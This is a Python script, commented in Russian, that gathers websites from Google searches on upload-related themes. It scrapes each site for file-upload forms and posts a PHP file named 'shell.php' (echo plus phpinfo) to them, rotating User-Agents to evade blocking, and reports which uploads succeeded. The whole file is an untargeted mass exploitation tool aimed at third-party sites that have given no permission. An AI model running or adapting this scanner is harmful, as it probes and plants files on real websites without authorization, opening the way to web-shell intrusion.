import aiohttp
import asyncio
from googlesearch import search
from random import choice
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time

# Готовим файл для теста
payload_file = "shell.php"
with open(payload_file, 'w') as f:
    f.write("""
<?php 
echo "Шелл загружен!"; 
phpinfo();
?>
    """)

# Список User-Agent'ов для обхода блокировок
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
]

# ANSI Escape Codes для цвета
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# Тематики для поиска
themes = [
    "news upload",                # Новостные сайты
    "forum upload",               # Форумы
    "article upload",             # Статьи
    "file sharing upload",        # Файлообменники
    "technology upload",          # Технологические сайты
    "education upload",           # Образовательные ресурсы
    "image upload",               # Сайты для загрузки изображений
    "community upload",           # Сайты сообщества
    "discussion upload",          # Обсуждения и форумы
    "e-commerce upload",          # Интернет-магазины
    "online store upload",        # Онлайн магазины
    "shop upload",                # Интернет-магазины с возможностью загрузки
    "product upload",             # Магазины, где можно загружать изображения товаров
    "retail upload",              # Розничные магазины с возможностью загрузки
]

# Функция для отправки поискового запроса в Google
def google_search(query, num_results=10):
    print(f"Поиск сайтов по запросу: {query}")
    try:
        return list(search(query, num_results=num_results))
    except Exception as e:
        print(f"Ошибка при поиске в Google: {e}")
        return []

# Функция для асинхронного сканирования сайта
async def scan_for_file_upload(session, url):
    try:
        headers = {'User-Agent': choice(USER_AGENTS)}

        # Выполняем GET-запрос с заголовками
        async with session.get(url, headers=headers) as response:
            if response.status != 200:
                print(f"[{url}] Ошибка получения страницы: {response.status}")
                return  # Пропускаем сайт, если не удается получить страницу

            # Парсим HTML страницы
            soup = BeautifulSoup(await response.text(), 'html.parser')
            forms = soup.find_all('form')

            # Проверка на наличие формы с файлом
            for form in forms:
                file_input = form.find('input', {'type': 'file'})
                if file_input:
                    # Пытаемся найти точку загрузки
                    action_url = form.get('action')
                    full_action_url = urljoin(url, action_url) if action_url else url
                    print(f"Найдена форма с загрузкой файлов на странице: {url}")
                    result, file_url = await try_upload_file(session, full_action_url, payload_file)
                    if result == "ДА":
                        print(f"{url} - {GREEN}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
                        print(f"Доступ к файлу: {file_url}")
                    else:
                        print(f"{url} - {RED}Ошибка при загрузке файла: {result}{RESET}")
                    # Не прерываем, продолжаем сканировать другие сайты
                    return  # Выходим из этой формы и переходим к следующему сайту

    except Exception as e:
        print(f"Ошибка при обработке сайта {url}: {str(e)}")
        return

# Попытка загрузить PHP файл
async def try_upload_file(session, action_url, payload_file):
    try:
        # Проверка, если URL действует для загрузки
        print(f"Попытка загрузки на {action_url}...")
        async with aiohttp.ClientSession() as upload_session:
            with open(payload_file, 'rb') as file:
                files = {'file': (payload_file, file, 'application/x-php')}
                async with upload_session.post(action_url, data=files) as upload_response:
                    if upload_response.status == 200:
                        # Проверим, был ли файл успешно загружен
                        text = await upload_response.text()
                        if 'php' in text:
                            # Попытаемся найти URL загруженного файла (это зависит от сайта)
                            file_url = f"{action_url}/{payload_file}"
                            return "ДА", file_url
                        else:
                            return "НЕТ", ""
                    elif upload_response.status == 405:  # Метод не разрешен
                        print(f"Ошибка 405 при загрузке на {action_url}. Пропускаем...")
                        return "Ошибка при загрузке: Метод не разрешен", ""
                    else:
                        return f"Ошибка при загрузке: {upload_response.status}", ""
    except Exception as e:
        return f"Ошибка при загрузке на {action_url}: {str(e)}", ""

# Основная функция для сканирования сайтов по поисковым запросам
async def scan_sites_from_themes():
    all_urls = []
    
    # Поиск по каждой теме
    for theme in themes:
        links = google_search(theme)
        all_urls.extend(links)

    if not all_urls:
        print("Не удалось найти сайты по указанным запросам.")
        return

    # Асинхронная сессия
    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in all_urls:
            tasks.append(scan_for_file_upload(session, url))

        # Параллельное выполнение всех задач
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Логируем ошибки
        for result in results:
            if isinstance(result, Exception):
                print(f"Произошла ошибка: {str(result)}")

# Запуск асинхронного сканирования
start_time = time.time()
asyncio.run(scan_sites_from_themes())
end_time = time.time()

print(f"Время выполнения: {end_time - start_time} секунд.")
